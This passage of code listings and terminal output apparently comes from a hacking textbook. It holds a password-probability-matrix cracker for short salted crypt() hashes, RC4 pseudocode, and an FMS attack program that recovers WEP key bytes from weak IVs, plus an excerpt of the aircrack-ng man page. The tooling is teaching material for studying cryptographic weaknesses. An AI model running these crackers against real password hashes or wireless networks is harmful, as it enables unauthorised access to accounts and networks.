(1<<(charval%8));\n\n               val = (2 * HEIGHT) + enum_hashtriplet(code[6], code[7], code[8]); //\n bytes 6-8\n               charval = (i-32)*95 + (j-32); // First 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n               val += (HEIGHT * 4);\n               charval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n\n               val = (3 * HEIGHT) + enum_hashtriplet(code[8], code[9], code[10]);\n // bytes 8-10\n               charval = (i-32)*95 + (j-32); // First 2 plaintext chars\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n               val += (HEIGHT * 4);\n               charval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n            }\n         }\n      }\n   }\n   printf(\"finished.. saving..\\n\");\n   fwrite(data, SIZE, 1, handle);\n   free(data);\n   fclose(handle); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -O3 -o ppm_gen ppm_gen.c -lcrypt\nreader@hacking:~/booksrc $ ./ppm_gen\nAdding   ** to 4char.ppm..\nAdding  !** to 4char.ppm..\nAdding  \"** to 4char.ppm..\n\n.:[ output trimmed ]:.\n\nAdding ~|** to 4char.ppm..\nAdding ~}** to 4char.ppm..\nAdding ~~** to 4char.ppm..\nfinished.. saving..\n@hacking:~ $ ls -lh 4char.ppm\n-rw-r--r-- 1 142M 2007-09-30 13:56 4char.ppm\nreader@hacking:~/booksrc $\n```", "```\n/*********************************************************\\\n*  Password Probability Matrix   *    File: ppm_crack.c   *\n***********************************************************\n*                                                         *\n*  Author:        Jon Erickson <matrix@phiral.com>        *\n*  Organization:  Phiral Research Laboratories            *\n*                                                         *\n*  This is the crack program for the PPM proof of concept.*\n*  It uses an existing file called 4char.ppm, which       *\n*  contains information regarding all possible 4-         *\n*  character passwords salted with 'je'.  This file can   *\n*  be generated with the corresponding ppm_gen.c program. *\n*                                                         *\n\\*********************************************************/\n\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n#define HEIGHT 16384\n#define WIDTH  1129\n#define DEPTH 8\n#define SIZE HEIGHT * WIDTH * DEPTH\n#define DCM HEIGHT * WIDTH\n\n/* Map a single hash byte to an enumerated value. */\nint enum_hashbyte(char a) {\n   int i, j;\n   i = (int)a;\n   if((i >= 46) && (i <= 57))\n      j = i - 46;\n   else if ((i >= 65) && (i <= 90))\n      j = i - 53;\n   else if ((i >= 97) && (i <= 122))\n      j = i - 59;\n   return j;\n}\n\n/* Map 3 hash bytes to an enumerated value. */\nint enum_hashtriplet(char a, char b, char c) {\n   return (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n}\n\n/* Merge two vectors. */\nvoid merge(char *vector1, char *vector2) {\n   int i;\n   for(i=0; i < WIDTH; i++)\n      vector1[i] &= vector2[i];\n}\n\n/* Returns the bit in the vector at the passed index position */\nint get_vector_bit(char *vector, int index) {\n   return ((vector[(index/8)]&(1<<(index%8)))>>(index%8));\n}\n\n/* Counts the number of plaintext pairs in the passed vector */\nint count_vector_bits(char *vector) {\n   int i, count=0;\n   for(i=0; i < 9025; i++)\n      count += get_vector_bit(vector, i);\n   return count;\n}\n\n/* Print the plaintext pairs that each ON bit in the vector enumerates. */\nvoid print_vector(char *vector) {\n   int i, a, b, val;\n   for(i=0; i < 9025; i++) {\n      if(get_vector_bit(vector, i) == 1) { // If bit is on,\n         a = i / 95;                  // calculate the\n         b = i - (a * 95);            // plaintext pair\n         printf(\"%c%c \",a+32, b+32);  // and print it.\n      }\n   }\n   printf(\"\\n\");\n}\n\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\n   printf(message, extra);\n   exit(1);\n}\n\n/* Crack a 4-character password using generated 4char.ppm file. */\nint main(int argc, char *argv[]) {\n  char *pass, plain[5];\n  unsigned char bin_vector1[WIDTH], bin_vector2[WIDTH], temp_vector[WIDTH];\n  char prob_vector1[2][9025];\n  char prob_vector2[2][9025];\n  int a, b, i, j, len, pv1_len=0, pv2_len=0;\n  FILE *fd;\n\n  if(argc < 1)\n     barf(\"Usage: %s <password hash>  (will use the file 4char.ppm)\\n\", argv[0]);\n\n  if(!(fd = fopen(\"4char.ppm\", \"r\")))\n     barf(\"Fatal: Couldn't open PPM file for reading.\\n\", NULL);\n\n  pass = argv[1]; // First argument is password hash\n\n  printf(\"Filtering possible plaintext bytes for the first two characters:\\n\");\n\n  fseek(fd,(DCM*0)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\n  fread(bin_vector1, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\n\n  len = count_vector_bits(bin_vector1);\n  printf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\n len*100.0/\n9025.0);\n\n  fseek(fd,(DCM*1)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\n  merge(bin_vector1, temp_vector);  // Merge it with the first vector.\n\n  len = count_vector_bits(bin_vector1);\n  printf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  fseek(fd,(DCM*2)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\n  merge(bin_vector1, temp_vector);  // Merge it with the first two vectors.\n\n  len = count_vector_bits(bin_vector1);\n  printf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  fseek(fd,(DCM*3)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\n  merge(bin_vector1, temp_vector);  // Merge it with the othes vectors.\n\n  len = count_vector_bits(bin_vector1);\n  printf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  printf(\"Possible plaintext pairs for the first two bytes:\\n\");\n  print_vector(bin_vector1);\n\n  printf(\"\\nFiltering possible plaintext bytes for the last two characters:\\n\");\n\n  fseek(fd,(DCM*4)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\n  fread(bin_vector2, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\n\n  len = count_vector_bits(bin_vector2);\n  printf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\n len*100.0/\n9025.0);\n\n  fseek(fd,(DCM*5)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\n  merge(bin_vector2, temp_vector);  // Merge it with the first vector.\n\n  len = count_vector_bits(bin_vector2);\n  printf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  fseek(fd,(DCM*6)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\n  merge(bin_vector2, temp_vector);  // Merge it with the first two vectors.\n\n  len = count_vector_bits(bin_vector2);\n  printf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  fseek(fd,(DCM*7)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\n  fread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\n  merge(bin_vector2, temp_vector);  // Merge it with the othes vectors.\n\n  len = count_vector_bits(bin_vector2);\n  printf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, \nlen*100.0/9025.0);\n\n  printf(\"Possible plaintext pairs for the last two bytes:\\n\");\n  print_vector(bin_vector2);\n  printf(\"Building probability vectors...\\n\");\n  for(i=0; i < 9025; i++) { // Find possible first two plaintext bytes.\n    if(get_vector_bit(bin_vector1, i)==1) {;\n      prob_vector1[0][pv1_len] = i / 95;\n      prob_vector1[1][pv1_len] = i - (prob_vector1[0][pv1_len] * 95);\n      pv1_len++;\n    }\n  }\n  for(i=0; i < 9025; i++) { // Find possible last two plaintext bytes.\n    if(get_vector_bit(bin_vector2, i)) {\n      prob_vector2[0][pv2_len] = i / 95;\n      prob_vector2[1][pv2_len] = i - (prob_vector2[0][pv2_len] * 95);\n      pv2_len++;\n    }\n  }\n\n  printf(\"Cracking remaining %d possibilites..\\n\", pv1_len*pv2_len);\n  for(i=0; i < pv1_len; i++) {\n    for(j=0; j < pv2_len; j++) {\n      plain[0] = prob_vector1[0][i] + 32;\n      plain[1] = prob_vector1[1][i] + 32;\n      plain[2] = prob_vector2[0][j] + 32;\n      plain[3] = prob_vector2[1][j] + 32;\n      plain[4] = 0;\n      if(strcmp(crypt(plain, \"je\"), pass) == 0) {\n        printf(\"Password :  %s\\n\", plain);\n        i = 31337;\n        j = 31337;\n      }\n    }\n  }\n  if(i < 31337)\n    printf(\"Password wasn't salted with 'je' or is not 4 chars long.\\n\");\n\n  fclose(fd); \n}\n```", "```\nreader@hacking:~/booksrc $ ./crypt_test h4R% je\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ gcc -O3 -o ppm_crack ppm_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./ppm_crack jeMqqfIfPNNTE\nFiltering possible plaintext bytes for the first two characters:\nonly 1 vector of 4:     3801 plaintext pairs, with 42.12% saturation\nvectors 1 AND 2 merged: 1666 plaintext pairs, with 18.46% saturation\nfirst 3 vectors merged: 695 plaintext pairs, with 7.70% saturation\nall 4 vectors merged:   287 plaintext pairs, with 3.18% saturation\nPossible plaintext pairs for the first two bytes:\n 4  9  N !& !M !Q \"/ \"5 \"W #K #d #g #p $K $O $s %) %Z %\\ %r &( &T '- '0 '7 'D\n'F (  (v (| )+ ). )E )W *c *p *q *t *x +C -5 -A -[ -a .% .D .S .f /t 02 07 0? \n0e 0{ 0| 1A 1U 1V 1Z 1d 2V 2e 2q 3P 3a 3k 3m 4E 4M 4P 4X 4f 6  6, 6C 7: 7@ 7S \n7z 8F 8H 9R 9U 9_ 9~ :- :q :s ;G ;J ;Z ;k <! <8 =! =3 =H =L =N =Y >V >X ?1 @#\n@W @v @| AO B/ B0 BO Bz C( D8 D> E8 EZ F@ G& G? Gj Gy H4 I@ J  JN JT JU Jh Jq \nKs Ku M) M{ N, N: NC NF NQ Ny O/ O[ P9 Pc Q! QA Qi Qv RA Sg Sv T0 Te U& U> UO \nVT V[ V] Vc Vg Vi W: WG X\" X6 XZ X` Xp YT YV Y^ Yl Yy Y{ Za [$ [* [9 [m [z \\\" \\\n+ \\C \\O \\w ]( ]: ]@ ]w _K _j `q a. aN a^ ae au b: bG bP cE cP dU d] e! fI fv g! \ngG h+ h4 hc iI iT iV iZ in k. kp l5 l` lm lq m, m= mE n0 nD nQ n~ o# o: o^ p0 \np1 pC pc q* q0 qQ q{ rA rY s\" sD sz tK tw u- v$ v. v3 v; v_ vi vo wP wt x\" x& \nx+ x1 xQ xX xi yN yo zO zP zU z[ z^ zf zi zr zt {- {B {a |s }) }+ }? }y ~L ~m \n\nFiltering possible plaintext bytes for the last two characters:\nonly 1 vector of 4:     3821 plaintext pairs, with 42.34% saturation\nvectors 1 AND 2 merged: 1677 plaintext pairs, with 18.58% saturation\nfirst 3 vectors merged: 713 plaintext pairs, with 7.90% saturation\nall 4 vectors merged:   297 plaintext pairs, with 3.29% saturation\nPossible plaintext pairs for the last two bytes:\n !  & != !H !I !K !P !X !o !~ \"r \"{ \"} #% #0 $5 $] %K %M %T &\" &% &( &0 &4 &I \n&q &} 'B 'Q 'd )j )w *I *] *e *j *k *o *w *| +B +W ,' ,J ,V -z .  .$ .T /' /_ \n0Y 0i 0s 1! 1= 1l 1v 2- 2/ 2g 2k 3n 4K 4Y 4\\ 4y 5- 5M 5O 5} 6+ 62 6E 6j 7* 74 \n8E 9Q 9\\ 9a 9b :8 :; :A :H :S :w ;\" ;& ;L <L <m <r <u =, =4 =v >v >x ?& ?` ?j \n?w @0 A* B  B@ BT C8 CF CJ CN C} D+ D? DK Dc EM EQ FZ GO GR H) Hj I: I> J( J+ \nJ3 J6 Jm K# K) K@ L, L1 LT N* NW N` O= O[ Ot P: P\\ Ps Q- Qa R% RJ RS S3 Sa T! \nT$ T@ TR T_ Th U\" U1 V* V{ W3 Wy Wz X% X* Y* Y? Yw Z7 Za Zh Zi Zm [F \\( \\3 \\5 \\\n_ \\a \\b \\| ]$ ]. ]2 ]? ]d ^[ ^~ `1 `F `f `y a8 a= aI aK az b, b- bS bz c( cg dB \ne, eF eJ eK eu fT fW fo g( g> gW g\\ h$ h9 h: h@ hk i? jN ji jn k= kj l7 lo m< \nm= mT me m| m} n% n? n~ o  oF oG oM p\" p9 p\\ q} r6 r= rB sA sN s{ s~ tX tp u  \nu2 uQ uU uk v# vG vV vW vl w* w> wD wv x2 xA y: y= y? yM yU yX zK zv {# {) {= \n{O {m |I |Z }. }; }d ~+ ~C ~a \nBuilding probability vectors...\nCracking remaining 85239 possibilites..\nPassword :  h4R%\nreader@hacking:~/booksrc $\n```", "```\nj = 0;\nfor i = 0 to 255\n{\n  j = (j + S[i] + K[i]) mod 256;\n  swap S[i] and S[j];\n}\n```", "```\ni = (i + 1) mod 256;\nj = (j + S[i]) mod 256;\nswap S[i] and S[j];\nt = (S[i] + S[j]) mod 256;\nOutput the value of S[t];\n```", "```\n#include <stdio.h>\n\n/* RC4 stream cipher */\nint RC4(int *IV, int *key) {\n   int K[256];\n   int S[256];\n   int seed[16];\n   int i, j, k, t;\n\n   //Seed = IV + key;\n   for(k=0; k<3; k++)\n      seed[k] = IV[k];\n   for(k=0; k<13; k++)\n      seed[k+3] = key[k];\n\n   // -= Key Scheduling Algorithm (KSA) =-\n   //Initialize the arrays.\n   for(k=0; k<256; k++) {\n      S[k] = k;\n      K[k] = seed[k%16];\n   }\n\n   j=0;\n   for(i=0; i < 256; i++) {\n      j = (j + S[i] + K[i])%256;\n      t=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);\n   }\n\n   // First step of PRGA for first keystream byte\n   i = 0;\n   j = 0;\n\n   i = i + 1;\n   j = j + S[i];\n\n   t=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);\n\n   k = (S[i] + S[j])%256;\n\n   return S[k];\n}\n\nint main(int argc, char *argv[]) {\n  int K[256];\n  int S[256];\n\n  int IV[3];\n  int key[13] = {1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213};\n  int seed[16];\n  int N = 256;\n  int i, j, k, t, x, A;\n  int keystream, keybyte;\n\n  int max_result, max_count;\n  int results[256];\n\n  int known_j, known_S;\n\n  if(argc < 2) {\n    printf(\"Usage: %s <keybyte to attack>\\n\", argv[0]);\n    exit(0);\n  }\n    A = atoi(argv[1]);\n    if((A > 12) || (A < 0)) {\n      printf(\"keybyte must be from 0 to 12.\\n\");\n      exit(0);\n    }\n\n  for(k=0; k < 256; k++)\n    results[k] = 0;\n\n  IV[0] = A + 3;\n  IV[1] = N - 1;\n\n  for(x=0; x < 256; x++) {\n    IV[2] = x;\n\n    keystream = RC4(IV, key);\n    printf(\"Using IV: (%d, %d, %d), first keystream byte is %u\\n\",\n        IV[0], IV[1], IV[2], keystream);\n\n    printf(\"Doing the first %d steps of KSA..  \", A+3);\n\n    //Seed = IV + key;\n    for(k=0; k<3; k++)\n      seed[k] = IV[k];\n    for(k=0; k<13; k++)\n      seed[k+3] = key[k];\n\n    // -= Key Scheduling Algorithm (KSA) =-\n    //Initialize the arrays.\n    for(k=0; k<256; k++) {\n      S[k] = k;\n      K[k] = seed[k%16];\n    }\n\n    j=0;\n    for(i=0; i < (A + 3); i++) {\n      j = (j + S[i] + K[i])%256;\n      t = S[i];\n      S[i] = S[j];\n      S[j] = t;\n    }\n\n    if(j < 2) {  // If j < 2, then S[0] or S[1] have been disturbed.\n      printf(\"S[0] or S[1] have been disturbed, discarding..\\n\");\n    } else {\n      known_j = j;\n      known_S = S[A+3];\n      printf(\"at KSA iteration #%d, j=%d and S[%d]=%d\\n\",\n          A+3, known_j, A+3, known_S);\n      keybyte = keystream - known_j - known_S;\n\n      while(keybyte < 0)\n        keybyte = keybyte + 256;\n      printf(\"key[%d] prediction = %d - %d - %d = %d\\n\",\n          A, keystream, known_j, known_S, keybyte);\n      results[keybyte] = results[keybyte] + 1;\n    }\n  }\n  max_result = -1;\n  max_count = 0;\n\n  for(k=0; k < 256; k++) {\n    if(max_count < results[k]) {\n      max_count = results[k];\n      max_result = k;\n    }\n  }\n  printf(\"\\nFrequency table for key[%d] (* = most frequent)\\n\", A);\n  for(k=0; k < 32; k++) {\n    for(i=0; i < 8; i++) {\n      t = k+i*32;\n      if(max_result == t)\n        printf(\"%3d %2d*| \", t, results[t]);\n      else\n        printf(\"%3d %2d | \", t, results[t]);\n    }\n    printf(\"\\n\");\n  }\n\n  printf(\"\\n[Actual Key] = (\");\n  for(k=0; k < 12; k++)\n    printf(\"%d, \",key[k]);\n  printf(\"%d)\\n\", key[12]);\n\n  printf(\"key[%d] is probably %d\\n\", A, max_result); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o fms fms.c\nreader@hacking:~/booksrc $ ./fms\nUsage: ./fms <keybyte to attack>\nreader@hacking:~/booksrc $ ./fms 0\nUsing IV: (3, 255, 0), first keystream byte is 7\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=5 and S[3]=1\nkey[0] prediction = 7 - 5 - 1 = 1\nUsing IV: (3, 255, 1), first keystream byte is 211\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=6 and S[3]=1\nkey[0] prediction = 211 - 6 - 1 = 204\nUsing IV: (3, 255, 2), first keystream byte is 241\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=7 and S[3]=1\nkey[0] prediction = 241 - 7 - 1 = 233\n\n.:[ output trimmed ]:.\n\nUsing IV: (3, 255, 252), first keystream byte is 175\nDoing the first 3 steps of KSA..  S[0] or S[1] have been disturbed, \ndiscarding..\nUsing IV: (3, 255, 253), first keystream byte is 149\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=2 and S[3]=1\nkey[0] prediction = 149 - 2 - 1 = 146\nUsing IV: (3, 255, 254), first keystream byte is 253\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=3 and S[3]=2\nkey[0] prediction = 253 - 3 - 2 = 248\nUsing IV: (3, 255, 255), first keystream byte is 72\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=4 and S[3]=1\nkey[0] prediction = 72 - 4 - 1 = 67\n\nFrequency table for key[0] (* = most frequent)\n  0  1 |  32  3 |  64  0 |  96  1 | 128  2 | 160  0 | 192  1 | 224  3 |\n  `1 10*`|  33  0 |  65  1 |  97  0 | 129  1 | 161  1 | 193  1 | 225  0 |\n  2  0 |  34  1 |  66  0 |  98  1 | 130  1 | 162  1 | 194  1 | 226  1 |\n  3  1 |  35  0 |  67  2 |  99  1 | 131  1 | 163  0 | 195  0 | 227  1 |\n  4  0 |  36  0 |  68  0 | 100  1 | 132  0 | 164  0 | 196  2 | 228  0 |\n  5  0 |  37  1 |  69  0 | 101  1 | 133  0 | 165  2 | 197  2 | 229  1 |\n  6  0 |  38  0 |  70  1 | 102  3 | 134  2 | 166  1 | 198  1 | 230  2 |\n  7  0 |  39  0 |  71  2 | 103  0 | 135  5 | 167  3 | 199  2 | 231  0 |\n  8  3 |  40  0 |  72  1 | 104  0 | 136  1 | 168  0 | 200  1 | 232  1 |\n  9  1 |  41  0 |  73  0 | 105  0 | 137  2 | 169  1 | 201  3 | 233  2 |\n 10  1 |  42  3 |  74  1 | 106  2 | 138  0 | 170  1 | 202  3 | 234  0 |\n 11  1 |  43  2 |  75  1 | 107  2 | 139  1 | 171  1 | 203  0 | 235  0 |\n 12  0 |  44  1 |  76  0 | 108  0 | 140  2 | 172  1 | 204  1 | 236  1 |\n 13  2 |  45  2 |  77  0 | 109  0 | 141  0 | 173  2 | 205  1 | 237  0 |\n 14  0 |  46  0 |  78  2 | 110  2 | 142  2 | 174  1 | 206  0 | 238  1 |\n 15  0 |  47  3 |  79  1 | 111  2 | 143  1 | 175  0 | 207  1 | 239  1 |\n 16  1 |  48  1 |  80  1 | 112  0 | 144  2 | 176  0 | 208  0 | 240  0 |\n 17  0 |  49  0 |  81  1 | 113  1 | 145  1 | 177  1 | 209  0 | 241  1 |\n 18  1 |  50  0 |  82  0 | 114  0 | 146  4 | 178  1 | 210  1 | 242  0 |\n 19  2 |  51  0 |  83  0 | 115  0 | 147  1 | 179  0 | 211  1 | 243  0 |\n 20  3 |  52  0 |  84  3 | 116  1 | 148  2 | 180  2 | 212  2 | 244  3 |\n 21  0 |  53  0 |  85  1 | 117  2 | 149  2 | 181  1 | 213  0 | 245  1 |\n 22  0 |  54  3 |  86  3 | 118  0 | 150  2 | 182  2 | 214  0 | 246  3 |\n 23  2 |  55  0 |  87  0 | 119  2 | 151  2 | 183  1 | 215  1 | 247  2 |\n 24  1 |  56  2 |  88  3 | 120  1 | 152  2 | 184  1 | 216  0 | 248  2 |\n 25  2 |  57  2 |  89  0 | 121  1 | 153  2 | 185  0 | 217  1 | 249  3 |\n 26  0 |  58  0 |  90  0 | 122  0 | 154  1 | 186  1 | 218  0 | 250  1 |\n 27  0 |  59  2 |  91  1 | 123  3 | 155  2 | 187  1 | 219  1 | 251  1 |\n 28  2 |  60  1 |  92  1 | 124  0 | 156  0 | 188  0 | 220  0 | 252  3 |\n 29  1 |  61  1 |  93  1 | 125  0 | 157  0 | 189  0 | 221  0 | 253  1 |\n 30  0 |  62  1 |  94  0 | 126  1 | 158  1 | 190  0 | 222  1 | 254  0 |\n 31  0 |  63  0 |  95  1 | 127  0 | 159  0 | 191  0 | 223  0 | 255  0 |\n\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\n`key[0] is probably 1`\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./fms 12\nUsing IV: (15, 255, 0), first keystream byte is 81\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=251 and S[15]=1\nkey[12] prediction = 81 - 251 - 1 = 85\nUsing IV: (15, 255, 1), first keystream byte is 80\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=252 and S[15]=1\nkey[12] prediction = 80 - 252 - 1 = 83\nUsing IV: (15, 255, 2), first keystream byte is 159\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=253 and S[15]=1\nkey[12] prediction = 159 - 253 - 1 = 161\n\n.:[ output trimmed ]:.\n\nUsing IV: (15, 255, 252), first keystream byte is 238\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=236 and S[15]=1\nkey[12] prediction = 238 - 236 - 1 = 1\nUsing IV: (15, 255, 253), first keystream byte is 197\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=236 and S[15]=1\nkey[12] prediction = 197 - 236 - 1 = 216\nUsing IV: (15, 255, 254), first keystream byte is 238\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=249 and S[15]=2\nkey[12] prediction = 238 - 249 - 2 = 243\nUsing IV: (15, 255, 255), first keystream byte is 176\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=250 and S[15]=1\nkey[12] prediction = 176 - 250 - 1 = 181\n\nFrequency table for key[12] (* = most frequent)\n  0  1 |  32  0 |  64  2 |  96  0 | 128  1 | 160  1 | 192  0 | 224  2 |\n  1  2 |  33  1 |  65  0 |  97  2 | 129  1 | 161  1 | 193  0 | 225  0 |\n  2  0 |  34  2 |  66  2 |  98  0 | 130  2 | 162  3 | 194  2 | 226  0 |\n  3  2 |  35  0 |  67  2 |  99  2 | 131  0 | 163  1 | 195  0 | 227  5 |\n  4  0 |  36  0 |  68  0 | 100  1 | 132  0 | 164  0 | 196  1 | 228  1 |\n  5  3 |  37  0 |  69  3 | 101  2 | 133  0 | 165  2 | 197  0 | 229  3 |\n  6  1 |  38  2 |  70  2 | 102  0 | 134  0 | 166  2 | 198  0 | 230  2 |\n  7  2 |  39  0 |  71  1 | 103  0 | 135  0 | 167  3 | 199  1 | 231  1 |\n  8  1 |  40  0 |  72  0 | 104  1 | 136  1 | 168  2 | 200  0 | 232  0 |\n  9  0 |  41  1 |  73  0 | 105  0 | 137  1 | 169  1 | 201  1 | 233  1 |\n 10  2 |  42  2 |  74  0 | 106  4 | 138  2 | 170  0 | 202  1 | 234  0 |\n 11  3 |  43  1 |  75  0 | 107  1 | 139  3 | 171  2 | 203  1 | 235  0 |\n 12  2 |  44  0 |  76  0 | 108  2 | 140  2 | 172  0 | 204  0 | 236  1 |\n 13  0 |  45  0 |  77  0 | 109  1 | 141  1 | 173  0 | 205  2 | 237  4 |\n 14  1 |  46  1 |  78  1 | 110  0 | 142  3 | 174  1 | 206  0 | 238  1 |\n 15  1 |  47  2 |  79  1 | 111  0 | 143  0 | 175  1 | 207  2 | 239  0 |\n 16  2 |  48  0 |  80  1 | 112  1 | 144  3 | 176  0 | 208  0 | 240  0 |\n 17  1 |  49  0 |  81  0 | 113  1 | 145  1 | 177  0 | 209  0 | 241  0 |\n 18  0 |  50  2 |  82  0 | 114  1 | 146  0 | 178  0 | 210  1 | 242  0 |\n 19  0 |  51  0 |  83  4 | 115  1 | 147  0 | 179  1 | 211  4 | 243  2 |\n 20  0 |  52  1 |  84  1 | 116  4 | 148  0 | 180  1 | 212  1 | 244  1 |\n 21  0 |  53  1 |  85  1 | 117  0 | 149  2 | 181  1 | `213 12*`| 245  1 |\n 22  1 |  54  3 |  86  0 | 118  0 | 150  1 | 182  2 | 214  3 | 246  1 |\n 23  0 |  55  3 |  87  0 | 119  1 | 151  0 | 183  0 | 215  0 | 247  0 |\n 24  0 |  56  1 |  88  0 | 120  0 | 152  2 | 184  0 | 216  2 | 248  0 |\n 25  1 |  57  0 |  89  0 | 121  2 | 153  0 | 185  2 | 217  1 | 249  0 |\n 26  1 |  58  0 |  90  1 | 122  0 | 154  1 | 186  0 | 218  1 | 250  2 |\n 27  2 |  59  1 |  91  1 | 123  0 | 155  1 | 187  1 | 219  0 | 251  2 |\n 28  2 |  60  2 |  92  1 | 124  1 | 156  1 | 188  1 | 220  0 | 252  0 |\n 29  1 |  61  1 |  93  3 | 125  2 | 157  2 | 189  2 | 221  0 | 253  1 |\n 30  0 |  62  1 |  94  0 | 126  0 | 158  1 | 190  1 | 222  1 | 254  2 |\n 31  0 |  63  0 |  95  1 | 127  0 | 159  0 | 191  0 | 223  2 | 255  0 |\n\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\n`key[12] is probably 213`\nreader@hacking:~/booksrc $\n```", "```\nAIRCRACK-NG(1)                                                   AIRCRACK-NG(1)\n\nNAME\n       aircrack-ng is a 802.11 WEP / WPA-PSK key cracker.\n\nSYNOPSIS\n       aircrack-ng [options] <.cap / .ivs file(s)>\n\nDESCRIPTION\n       aircrack-ng is a 802.11 WEP / WPA-PSK key cracker. It implements the so-\n       called Fluhrer - Mantin - Shamir (FMS) attack, along with some new attacks\n       by a talented hacker named KoreK. When enough encrypted packets have been\n       gathered, aircrack-ng can almost instantly recover the WEP key.\n\nOPTIONS\n       Common options:\n\n       -a <amode>\n              Force the attack mode, 1 or wep for WEP and 2 or wpa for WPA-PSK.\n\n       -e <essid>\n              Select the target network based on the ESSID. This option is also\n              required for WPA cracking if the SSID is cloacked.\n```"]